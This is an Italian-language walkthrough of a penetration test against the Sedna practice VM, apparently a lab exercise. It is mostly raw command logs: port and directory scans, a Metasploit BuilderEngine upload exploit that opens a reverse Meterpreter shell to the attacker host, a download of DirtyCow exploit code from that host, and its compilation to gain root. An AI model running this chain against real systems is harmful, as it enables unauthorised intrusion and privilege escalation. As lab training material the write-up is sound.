@@ -1,0 +1,456 @@
+***PEN TEST VM SEDNA***
+
+***INIZIO LA SCANSIONE CON nmap***
+    nmap -sT 192.168.236.146 -p-
+    Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-10 15:34 CET
+    Nmap scan report for 192.168.236.146
+    Host is up (0.0012s latency).
+    Not shown: 65523 closed ports
+    PORT      STATE SERVICE
+    22/tcp    open  ssh
+    53/tcp    open  domain
+    80/tcp    open  http
+    110/tcp   open  pop3
+    111/tcp   open  rpcbind
+    139/tcp   open  netbios-ssn
+    143/tcp   open  imap
+    445/tcp   open  microsoft-ds
+    993/tcp   open  imaps
+    995/tcp   open  pop3s
+    8080/tcp  open  http-proxy
+    53625/tcp open  unknown
+
+***FACCIO UNA SCANSIONE CON DIRB***
+    root@ermy:~# dirb http://192gcc.168.236.146
+
+        -----------------
+        DIRB v2.22
+        By The Dark Raver
+        -----------------
+
+        START_TIME: Sun Feb 10 16:05:28 2019
+        URL_BASE: http://192.168.236.146/
+        WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+        -----------------
+
+        GENERATED WORDS: 4612
+
+        ---- Scanning URL: http://192.168.236.146/ ----
+        ==> DIRECTORY: http://192.168.236.146/blocks/
+        ==> DIRECTORY: http://192.168.236.146/files/
+        + http://192.168.236.146/index.html (CODE:200|SIZE:101)
+        ==> DIRECTORY: http://192.168.236.146/modules/
+        + http://192.168.236.146/robots.txt (CODE:200|SIZE:36)
+        + http://192.168.236.146/server-status (CODE:403|SIZE:295)
+        ==> DIRECTORY: http://192.168.236.146/system/
+        ==> DIRECTORY: http://192.168.236.146/themes/
+
+        ---- Entering directory: http://192.168.236.146/blocks/ ----
+        (!) WARNING: Directory IS LISTABLE. No need to scan it.
+            (Use mode '-w' if you want to scan it anyway)
+
+        ---- Entering directory: http://192.168.236.146/files/ ----
+        (!) WARNING: Directory IS LISTABLE. No need to scan it.
+            (Use mode '-w' if you want to scan it anyway)
+
+        ---- Entering directory: http://192.168.236.146/modules/ ----
+        (!) WARNING: Directory IS LISTABLE. No need to scan it.
+            (Use mode '-w' if you want to scan it anyway)
+
+        ---- Entering directory: http://192.168.236.146/system/ ----
+        ==> DIRECTORY: http://192.168.236.146/system/core/
+        ==> DIRECTORY: http://192.168.236.146/system/database/
+        ==> DIRECTORY: http://192.168.236.146/system/fonts/
+        ==> DIRECTORY: http://192.168.236.146/system/helpers/
+        + http://192.168.236.146/system/index.html (CODE:200|SIZE:142)
+        ==> DIRECTORY: http://192.168.236.146/system/language/
+        ==> DIRECTORY: http://192.168.236.146/system/libraries/
+
+        ---- Entering directory: http://192.168.236.146/themes/ ----
+        (!) WARNING: Directory IS LISTABLE. No need to scan it.
+            (Use mode '-w' if you want to scan it anyway)
+
+        ---- Entering directory: http://192.168.236.146/system/core/ ----
+        ==> DIRECTORY: http://192.168.236.146/system/core/compat/
+        + http://192.168.236.146/system/core/index.html (CODE:200|SIZE:142)
+
+        ---- Entering directory: http://192.168.236.146/system/database/ ----
+        ==> DIRECTORY: http://192.168.236.146/system/database/drivers/
+        + http://192.168.236.146/system/database/index.html (CODE:200|SIZE:142)
+
+        ---- Entering directory: http://192.168.236.146/system/fonts/ ----
+        + http://192.168.236.146/system/fonts/index.html (CODE:200|SIZE:142)
+
+        ---- Entering directory: http://192.168.236.146/system/helpers/ ----
+        + http://192.168.236.146/system/helpers/index.html (CODE:200|SIZE:142)
+
+        ---- Entering directory: http://192.168.236.146/system/language/ ----
+        ==> DIRECTORY: http://192.168.236.146/system/language/english/
+        + http://192.168.236.146/system/language/index.html (CODE:200|SIZE:142)
+
+        ---- Entering directory: http://192.168.236.146/system/libraries/ ----
+        + http://192.168.236.146/system/libraries/index.html (CODE:200|SIZE:142)
+
+        ---- Entering directory: http://192.168.236.146/system/core/compat/ ----
+        + http://192.168.236.146/system/core/compat/index.html (CODE:200|SIZE:142)
+
+        ---- Entering directory: http://192.168.236.146/system/database/drivers/ ----
+        + http://192.168.236.146/system/database/drivers/index.html (CODE:200|SIZE:142)
+        ==> DIRECTORY: http://192.168.236.146/system/database/drivers/mssql/
+        ==> DIRECTORY: http://192.168.236.146/system/database/drivers/mysql/
+        ==> DIRECTORY: http://192.168.236.146/system/database/drivers/odbc/
+
+        ---- Entering directory: http://192.168.236.146/system/language/english/ ----
+        + http://192.168.236.146/system/language/english/index.html (CODE:200|SIZE:142)
+
+        ---- Entering directory: http://192.168.236.146/system/database/drivers/mssql/ ----
+        + http://192.168.236.146/system/database/drivers/mssql/index.html (CODE:200|SIZE:142)
+
+        ---- Entering directory: http://192.168.236.146/system/database/drivers/mysql/ ----
+        + http://192.168.236.146/system/database/drivers/mysql/index.html (CODE:200|SIZE:142)
+
+        ---- Entering directory: http://192.168.236.146/system/database/drivers/odbc/ ----
+        + http://192.168.236.146/system/database/drivers/odbc/index.html (CODE:200|SIZE:142)
+
+        -----------------
+        END_TIME: Sun Feb 10 16:06:00 2019
+        DOWNLOADED: 64568 - FOUND: 16
+
+***Visitando la pagina ...... ho trovato un servizio BuilderEngine attivo. Provo a fare una ricerca con msfconsole per vedere se è possibile effettuare un exploit***
+
+    msf5 auxiliary(scanner/http/tomcat_mgr_login) > search BuilderEngine
+
+    Matching Modules
+    ================
+
+       Name                                          Disclosure Date  Rank       Check  Description
+       ----                                          ---------------  ----       -----  -----------
+       exploit/multi/http/builderengine_upload_exec  2016-09-18       excellent  Yes    BuilderEngine Arbitrary File Upload Vulnerability and execution
+
+***Trovato l'exploit, provo a sfruttarlo***
+
+    msf5 auxiliary(scanner/http/tomcat_mgr_login) > use exploit/multi/http/builderengine_upload_exec
+    msf5 exploit(multi/http/builderengine_upload_exec) > show options
+
+        Module options (exploit/multi/http/builderengine_upload_exec):
+
+           Name       Current Setting  Required  Description
+           ----       ---------------  --------  -----------
+           Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+           RHOSTS                      yes       The target address range or CIDR identifier
+           RPORT      80               yes       The target port (TCP)
+           SSL        false            no        Negotiate SSL/TLS for outgoing connections
+           TARGETURI  /                yes       The base path to BuilderEngine
+           VHOST                       no        HTTP server virtual host
+
+
+        Exploit target:
+
+           Id  Name
+           --  ----
+           0   BuilderEngine 3.5.0
+
+***Imposto RHOST e cerco un payload***
+
+    msf5 exploit(multi/http/builderengine_upload_exec) > set RHOSTS 192.168.236.146
+        RHOSTS => 192.168.236.146
+
+    msf5 exploit(multi/http/builderengine_upload_exec) > set payload
+        set payload generic/custom                      set payload php/bind_php_ipv6                   set payload php/meterpreter/bind_tcp_uuid
+        set payload generic/shell_bind_tcp              set payload php/download_exec                   set payload php/meterpreter/reverse_tcp
+        set payload generic/shell_reverse_tcp           set payload php/exec                            set payload php/meterpreter/reverse_tcp_uuid
+        set payload php/bind_perl                       set payload php/meterpreter/bind_tcp            set payload php/meterpreter_reverse_tcp
+        set payload php/bind_perl_ipv6                  set payload php/meterpreter/bind_tcp_ipv6       set payload php/reverse_perl
+        set payload php/bind_php                        set payload php/meterpreter/bind_tcp_ipv6_uuid  set payload php/reverse_php
+        set payload php/bind_php                        set payload php/meterpreter/bind_tcp_ipv6_uuid  set payload php/reverse_php
+
+    msf5 exploit(multi/http/builderengine_upload_exec) > set payload php/meterpreter_reverse_tcp
+        payload => php/meterpreter_reverse_tcp
+
+    msf5 exploit(multi/http/builderengine_upload_exec) > show options
+
+        Module options (exploit/multi/http/builderengine_upload_exec):
+
+           Name       Current Setting  Required  Description
+           ----       ---------------  --------  -----------
+           Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+           RHOSTS     192.168.236.146  yes       The target address range or CIDR identifier
+           RPORT      80               yes       The target port (TCP)
+           SSL        false            no        Negotiate SSL/TLS for outgoing connections
+           TARGETURI  /                yes       The base path to BuilderEngine
+           VHOST                       no        HTTP server virtual host
+
+
+        Payload options (php/meterpreter_reverse_tcp):
+
+           Name   Current Setting  Required  Description
+           ----   ---------------  --------  -----------
+           LHOST  192.168.236.1    yes       The listen address (an interface may be specified)
+           LPORT  4444             yes       The listen port
+
+
+        Exploit target:
+
+           Id  Name
+           --  ----
+           0   BuilderEngine 3.5.0
+
+***Lancio l'exploit***
+    msf5 exploit(multi/http/builderengine_upload_exec) > exploit
+
+        [*] Started reverse TCP handler on 192.168.236.1:4444
+        [+] Our payload is at: jHuZFRlvElgW.php. Calling payload...
+        [*] Calling payload...
+        [*] Meterpreter session 2 opened (192.168.236.1:4444 -> 192.168.236.146:35237) at 2019-02-10 16:20:48 +0100
+        [!] Tried to delete jHuZFRlvElgW.php, unknown result
+
+    meterpreter > guid
+        [+] Session GUID: f4cbd651-e38f-4397-9811-718dd7072ff9
+    meterpreter >
+
+***Apro una shell con Meterpreter***
+
+    meterpreter > shell
+        Process 22620 created.
+        Channel 0 created.
+        id
+        uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+        wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl > raw.pl
+        --2019-02-10 09:33:24--  https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
+        Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.0.133, 151.101.192.133, 151.101.128.133, ...
+        Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.0.133|:443... connected.
+        HTTP request sent, awaiting response... 200 OK
+        Length: 22459 (22K) [text/plain]
+        Saving to: 'linux-exploit-suggester-2.pl'
+
+             0K .......... .......... .                               100%  274K=0.08s
+
+        2019-02-10 09:33:40 (274 KB/s) - 'linux-exploit-suggester-2.pl' saved [22459/22459]
+
+        ls
+        be_demo
+        blogimage.jpg
+        captcha
+        linux-exploit-suggester-2.pl
+        loading.gif
+        raw.pl
+        users
+        chmod +x raw.pl
+        ./raw.pl
+        ls
+        be_demo
+        blogimage.jpg
+        captcha
+        linux-exploit-suggester-2.pl
+        loading.gif
+        raw.pl
+        users
+
+
+
+
+
+        ls
+        be_demo
+        blogimage.jpg
+        captcha
+        linux-exploit-suggester-2.pl
+        loading.gif
+        raw.pl
+        users
+        chmod +x linux-exploit-suggester-2.pl
+        ./linux-exploit-suggester-2.pl
+
+          #############################
+            Linux Exploit Suggester 2
+          #############################
+
+          Local Kernel: 3.13.0
+          Searching among 73 exploits...
+
+          Possible Exploits:
+        [+] dirty_cow
+             CVE-2016-5195
+             Source: https://www.exploit-db.com/exploits/40616/
+        [+] exploit_x
+             CVE-2018-14665
+             Source: https://www.exploit-db.com/exploits/45697
+        [+] overlayfs
+             CVE-2015-8660
+             Source: https://www.exploit-db.com/exploits/39230/
+        [+] pp_key
+             CVE-2016-0728
+             Source: https://www.exploit-db.com/exploits/39277/
+        [+] timeoutpwn
+             CVE-2014-0038
+             Source: http://www.exploit-db.com/exploits/31346/
+
+        exit
+    meterpreter > background
+        [*] Backgrounding session 3...
+    msf5 exploit(multi/http/builderengine_upload_exec) > search dirty_cow
+
+    msf5 exploit(multi/http/builderengine_upload_exec) > sessions -i 2
+        [*] Starting interaction with 2...
+
+    meterpreter > gcc -h
+        [-] Unknown command: gcc.
+    meterpreter > shell
+        Process 27527 created.
+        Channel 2 created.
+
+        python -c 'import pty; pty.spawn("/bin/bash");'
+        www-data@Sedna:/var/www/html/files$ uname -a
+        uname -a
+        Linux Sedna 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 i686 i686 GNU/Linux
+
+    meterpreter > shell
+        Process 29502 created.
+        Channel 3 created.
+        python -c 'import pty; pty.spawn("/bin/bash");'
+        www-data@Sedna:/var/www/html/files$ wget http://192.168.236.1/40616.c
+        wget http://192.168.236.1/40616.c
+        --2019-02-10 10:04:01--  http://192.168.236.1/40616.c
+        Connecting to 192.168.236.1:80... failed: Connection refused.
+        www-data@Sedna:/var/www/html/files$ ls
+        ls
+        be_demo        captcha			     loading.gif  users
+        blogimage.jpg  linux-exploit-suggester-2.pl  raw.pl
+        www-data@Sedna:/var/www/html/files$ wget http://192.168.236.1/40616.c
+        wget http://192.168.236.1/40616.c
+        --2019-02-10 10:05:00--  http://192.168.236.1/40616.c
+        Connecting to 192.168.236.1:80... connected.
+        HTTP request sent, awaiting response... 200 OK
+        Length: 4957 (4.8K) [text/x-csrc]
+        Saving to: '40616.c'
+
+        100%[======================================>] 4,957       --.-K/s   in 0s
+
+        2019-02-10 10:05:00 (627 MB/s) - '40616.c' saved [4957/4957]
+
+        www-data@Sedna:/var/www/html/files$ ls
+        ls
+        40616.c  blogimage.jpg	linux-exploit-suggester-2.pl  raw.pl
+        be_demo  captcha	loading.gif		      users
+        www-data@Sedna:/var/www/html/files$ gcc 40616.c -o cowroot -phthread
+        gcc 40616.c -o cowroot -phthread
+        gcc: error: unrecognized command line option '-phthread'
+        www-data@Sedna:/var/www/html/files$ gcc 40616.c -o cowroot -pthread
+        gcc 40616.c -o cowroot -pthread
+        40616.c:62:1: error: unknown type name '$'
+         $ msfvenom -p linux/x86/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i
+         ^
+        40616.c:62:12: error: expected '=', ',', ';', 'asm' or '__attribute__' before '-' token
+         $ msfvenom -p linux/x86/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i
+                    ^
+        40616.c: In function 'procselfmemThread':
+        40616.c:98:9: warning: passing argument 2 of 'lseek' makes integer from pointer without a cast [enabled by default]
+                 lseek(f,map,SEEK_SET);
+                 ^
+        In file included from 40616.c:28:0:
+        /usr/include/unistd.h:334:16: note: expected '__off_t' but argument is of type 'void *'
+         extern __off_t lseek (int __fd, __off_t __offset, int __whence) __THROW;
+                        ^
+        40616.c: In function 'waitForWrite':
+        40616.c:112:24: error: 'sc' undeclared (first use in this function)
+                 if(memcmp(buf, sc, sc_len) == 0) {
+                                ^
+        40616.c:112:24: note: each undeclared identifier is reported only once for each function it appears in
+        40616.c: In function 'main':
+        40616.c:141:5: warning: format '%d' expects argument of type 'int', but argument 2 has type '__off_t' [-Wformat=]
+             printf("Size of binary: %d\n", st.st_size);
+             ^
+        40616.c:145:21: error: 'sc' undeclared (first use in this function)
+             memcpy(payload, sc, sc_len+1);
+                             ^
+        www-data@Sedna:/var/www/html/files$ ./cowroot
+        ./cowroot
+        bash: ./cowroot: No such file or directory
+        www-data@Sedna:/var/www/html/files$ echo 0 > /proc/sys/vm/dirty_writeback_centisecs
+        <l/files$ echo 0 > /proc/sys/vm/dirty_writeback_centisecs
+        bash: /proc/sys/vm/dirty_writeback_centisecs: Permission denied
+        www-data@Sedna:/var/www/html/files$ ls
+        ls
+        40616.c  blogimage.jpg	linux-exploit-suggester-2.pl  raw.pl
+        be_demo  captcha	loading.gif		      users
+        www-data@Sedna:/var/www/html/files$ rm 40616.c
+        rm 40616.c
+        www-data@Sedna:/var/www/html/files$ ls
+        ls
+        be_demo        captcha			     loading.gif  users
+        blogimage.jpg  linux-exploit-suggester-2.pl  raw.pl
+        www-data@Sedna:/var/www/html/files$ ls
+        ls
+        be_demo        captcha			     loading.gif  users
+        blogimage.jpg  linux-exploit-suggester-2.pl  raw.pl
+        www-data@Sedna:/var/www/html/files$
+
+        www-data@Sedna:/var/www/html/files$
+
+        www-data@Sedna:/var/www/html/files$
+
+        www-data@Sedna:/var/www/html/files$
+
+        www-data@Sedna:/var/www/html/files$ wget http://192.168.236.1/40616.c
+        wget http://192.168.236.1/40616.c
+        --2019-02-10 10:12:41--  http://192.168.236.1/40616.c
+        Connecting to 192.168.236.1:80... connected.
+        HTTP request sent, awaiting response... 200 OK
+        Length: 3624 (3.5K) [text/x-csrc]
+        Saving to: '40616.c'
+
+        100%[======================================>] 3,624       --.-K/s   in 0s
+
+        2019-02-10 10:12:41 (275 MB/s) - '40616.c' saved [3624/3624]
+
+        www-data@Sedna:/var/www/html/files$ ls
+        ls
+        40616.c  blogimage.jpg	linux-exploit-suggester-2.pl  raw.pl
+        be_demo  captcha	loading.gif		      users
+        www-data@Sedna:/var/www/html/files$ echo 0 > /proc/sys/vm/dirty_writeback_centisecs
+        <l/files$ echo 0 > /proc/sys/vm/dirty_writeback_centisecs
+        bash: /proc/sys/vm/dirty_writeback_centisecs: Permission denied
+        www-data@Sedna:/var/www/html/files$ cd ..
+        cd ..
+        www-data@Sedna:/var/www/html$ cd files
+        cd files
+        www-data@Sedna:/var/www/html/files$ ls
+        ls
+        40616.c  blogimage.jpg	linux-exploit-suggester-2.pl  raw.pl
+        be_demo  captcha	loading.gif		      users
+        www-data@Sedna:/var/www/html/files$ gcc 40616.c -o cowroot -pthread
+        gcc 40616.c -o cowroot -pthread
+        40616.c: In function 'procselfmemThread':
+        40616.c:75:9: warning: passing argument 2 of 'lseek' makes integer from pointer without a cast [enabled by default]
+                 lseek(f,map,SEEK_SET);
+                 ^
+        In file included from 40616.c:28:0:
+        /usr/include/unistd.h:334:16: note: expected '__off_t' but argument is of type 'void *'
+         extern __off_t lseek (int __fd, __off_t __offset, int __whence) __THROW;
+                        ^
+        40616.c: In function 'main':
+        40616.c:118:5: warning: format '%d' expects argument of type 'int', but argument 2 has type '__off_t' [-Wformat=]
+             printf("Size of binary: %d\n", st.st_size);
+             ^
+        www-data@Sedna:/var/www/html/files$ ls
+        ls
+        40616.c  blogimage.jpg	cowroot			      loading.gif  users
+        be_demo  captcha	linux-exploit-suggester-2.pl  raw.pl
+        www-data@Sedna:/var/www/html/files$ ./cowroot
+        ./cowroot
+        DirtyCow root privilege escalation
+        Backing up /usr/bin/passwd.. to /tmp/bak
+        Size of binary: 45420
+        Racing, this may take a while..
+        thread stopped
+        thread stopped
+        /usr/bin/passwd is overwritten
+        Popping root shell.
+        Don't forget to restore /tmp/bak
+        root@Sedna:/var/www/html/files# id
+        id
+        uid=0(root) gid=33(www-data) groups=0(root),33(www-data)
+
+root@Sedna:/var/www/html/files#
